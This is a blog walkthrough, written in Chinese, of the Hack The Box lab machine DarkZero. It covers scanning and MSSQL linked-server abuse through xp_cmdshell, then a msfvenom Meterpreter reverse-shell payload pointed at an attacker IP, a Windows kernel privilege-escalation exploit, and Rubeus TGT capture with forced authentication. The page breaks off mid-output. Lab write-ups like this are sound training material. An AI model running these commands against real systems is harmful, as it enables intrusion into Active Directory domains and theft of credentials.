@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar-1080x1080.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar-1080x1080.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l1nk.icu","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Hack The Box [Season9] DarkZero Windows Hard">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Season9] DarkZero WP">
+<meta property="og:url" content="http://l1nk.icu/2025/10/09/Season9-DarkZero/index.html">
+<meta property="og:site_name" content="L1nk&#39;s Blog">
+<meta property="og:description" content="Hack The Box [Season9] DarkZero Windows Hard">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-10-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-11T16:00:00.000Z">
+<meta property="article:author" content="l1nk">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://l1nk.icu/2025/10/09/Season9-DarkZero/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://l1nk.icu/2025/10/09/Season9-DarkZero/","path":"2025/10/09/Season9-DarkZero/","title":"[Season9] DarkZero WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Season9] DarkZero WP | L1nk's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L1nk's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#User-flag"><span class="nav-number">1.</span> <span class="nav-text">User flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-flag"><span class="nav-number">2.</span> <span class="nav-text">Root flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="l1nk"
+      src="/images/avatar-1080x1080.png">
+  <p class="site-author-name" itemprop="name">l1nk</p>
+  <div class="site-description" itemprop="description">Vidar-Team Web | Student</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kn1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kn1l" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:l1nk@foxmail.com" title="E-Mail → mailto:l1nk@foxmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/l1nkowo" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;l1nkowo" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://www.kinoko.fun/" title="https:&#x2F;&#x2F;www.kinoko.fun&#x2F;" rel="noopener" target="_blank">Kinoko</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://tech.ec3o.fun/" title="https:&#x2F;&#x2F;tech.ec3o.fun&#x2F;" rel="noopener" target="_blank">Ec3o</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.z221x.website/" title="https:&#x2F;&#x2F;www.z221x.website&#x2F;" rel="noopener" target="_blank">z221x</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.4db.icu/" title="https:&#x2F;&#x2F;blog.4db.icu&#x2F;" rel="noopener" target="_blank">Fc04dB</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.naclwww.com/" title="https:&#x2F;&#x2F;blog.naclwww.com&#x2F;" rel="noopener" target="_blank">NaCl</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.kiracoon.top/" title="https:&#x2F;&#x2F;blog.kiracoon.top&#x2F;" rel="noopener" target="_blank">Kiracoon</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://mysid.top/" title="https:&#x2F;&#x2F;mysid.top&#x2F;" rel="noopener" target="_blank">mysid</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://l1nk.icu/2025/10/09/Season9-DarkZero/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar-1080x1080.png">
+      <meta itemprop="name" content="l1nk">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1nk's Blog">
+      <meta itemprop="description" content="Vidar-Team Web | Student">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Season9] DarkZero WP | L1nk's Blog">
+      <meta itemprop="description" content="Hack The Box [Season9] DarkZero Windows Hard">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Season9] DarkZero WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-10-09 00:00:00" itemprop="dateCreated datePublished" datetime="2025-10-09T00:00:00+08:00">2025-10-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-10-12 00:00:00" itemprop="dateModified" datetime="2025-10-12T00:00:00+08:00">2025-10-12</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>1.3k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>5 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">Hack The Box [Season9] DarkZero Windows Hard</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain?       syn-ack ttl 127</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    bind</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-12 10:06:51Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.darkzero.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.darkzero.htb</span><br><span class="line">| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-07-29T11:40:00</span><br><span class="line">| Not valid after:  2026-07-29T11:40:00</span><br><span class="line">| MD5:   ce57 1ac8 da76 eb62 efe8 4e85 045b d440</span><br><span class="line">| SHA-1: 603a f638 aabb 7eaa 1bdb 4256 5869 4de2 98b6 570c</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server  16.00.1000.00</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: darkzero</span><br><span class="line">|   NetBIOS_Domain_Name: darkzero</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: darkzero.htb</span><br><span class="line">|   DNS_Computer_Name: DC01.darkzero.htb</span><br><span class="line">|   DNS_Tree_Name: darkzero.htb</span><br><span class="line">|_  Product_Version: 10.0.26100</span><br><span class="line">2179/tcp  open  vmrdp?        syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49687/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49909/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49947/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49993/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">54502/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.11.89:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server </span><br><span class="line">|       number: 16.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server </span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 47014/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 35679/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 7628/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 13287/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure>
+
+<p>1433 是 mssql server，使用 <code>mssqlclient</code> 和提供的凭据登录</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89 -windows-auth</span><br></pre></td></tr></table></figure>
+
+<p>看到有链接数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (darkzero\john.w  guest<span class="variable">@master</span>)<span class="operator">&gt;</span> enum_links </span><br><span class="line">[<span class="operator">%</span>] <span class="keyword">EXEC</span> sp_linkedservers</span><br><span class="line">SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   </span><br><span class="line"><span class="comment">-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   </span></span><br><span class="line">DC01                SQLNCLI            <span class="keyword">SQL</span> Server    DC01                <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>           <span class="keyword">NULL</span>      </span><br><span class="line"></span><br><span class="line">DC02.darkzero.ext   SQLNCLI            <span class="keyword">SQL</span> Server    DC02.darkzero.ext   <span class="keyword">NULL</span>                 <span class="keyword">NULL</span>           <span class="keyword">NULL</span>      </span><br><span class="line"></span><br><span class="line">[<span class="operator">%</span>] <span class="keyword">EXEC</span> sp_helplinkedsrvlogin</span><br><span class="line">Linked Server       <span class="keyword">Local</span> Login       <span class="keyword">Is</span> Self Mapping   Remote Login   </span><br><span class="line"><span class="comment">-----------------   ---------------   ---------------   ------------   </span></span><br><span class="line">DC02.darkzero.ext   darkzero\john.w                 <span class="number">0</span>   dc01_sql_svc   </span><br></pre></td></tr></table></figure>
+
+<p>切换到 <code>DC02.darkzero.ext</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use_link [DC02.darkzero.ext]</span><br></pre></td></tr></table></figure>
+
+<p>有启用 <code>xp_cmdshell</code> 的权限，可以弹 shell</p>
+<p>生成一个 meterpreter 传上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.10.16.10 LPORT=4444 -f exe -o htb.exe</span><br></pre></td></tr></table></figure>
+
+<p>枚举一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"> #   Name                                                           Potentially Vulnerable?  Check Result</span><br><span class="line"> -   ----                                                           -----------------------  ------------</span><br><span class="line"> 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.</span><br><span class="line"> 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.</span><br><span class="line"> 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022</span><br><span class="line"> 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.</span><br><span class="line"> 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default</span><br><span class="line"> 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.</span><br><span class="line"> 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113</span><br><span class="line"> 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022</span><br><span class="line"> 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.</span><br></pre></td></tr></table></figure>
+
+<p>测试发现 <code>exploit/windows/local/cve_2024_30088_authz_basep</code> 可以利用</p>
+<p>在 C:\Users\Administrator\Desktop 下发现 user.txt</p>
+<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>收集信息，没什么特殊权限，有域信任且 DC01 上设置了非约束委派</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域信任</span></span><br><span class="line">nltest /domain_trusts</span><br><span class="line">List of domain trusts:</span><br><span class="line">    <span class="number">0</span>: darkzero darkzero.htb (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )</span><br><span class="line">    <span class="number">1</span>: darkzero<span class="literal">-ext</span> darkzero.ext (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">The command completed successfully</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=darkzero.htb,CN=System,DC=darkzero,DC=ext</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : darkzero.htb</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">700</span>b5e64<span class="literal">-8ae9-4528-a968-26e2b4a44509</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=darkzero,DC=ext</span><br><span class="line">Target                  : darkzero.htb</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           : </span><br><span class="line">TrustingPolicy          : </span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启了TGTDelegation非约束委派</span></span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-server</span> darkzero.htb <span class="literal">-Filter</span> *</span><br><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-server</span> darkzero.htb <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=darkzero.ext,CN=System,DC=darkzero,DC=htb</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : darkzero.ext</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : dc96b90d<span class="literal">-8181-4c7f-90df-54b9814a8c06</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=darkzero,DC=htb</span><br><span class="line">Target                  : darkzero.ext</span><br><span class="line">TGTDelegation           : True</span><br><span class="line">TrustAttributes         : <span class="number">2056</span></span><br><span class="line">TrustedPolicy           : </span><br><span class="line">TrustingPolicy          : </span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
+
+<p>用 <code>Rubeus</code> 监听 LSASS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\TEMP&gt; .\Rubeus.exe monitor /interval:5</span><br></pre></td></tr></table></figure>
+
+<p>触发 DC01 的认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_dirtree &quot;\\DC02.darkzero.ext\test&quot;</span><br></pre></td></tr></table></figure>
+
+<p>拿到 TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] 10/11/2025 x:x:52 PM UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DC01$@DARKZERO.HTB</span><br><span class="line">  StartTime             :  10/11/2025 xx:xx:15 PM</span><br><span class="line">  EndTime               :  10/12/2025 xx:xx:15 AM</span><br><span class="line">  RenewTill             :  10/18/2025 xx:xx:15 PM</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span 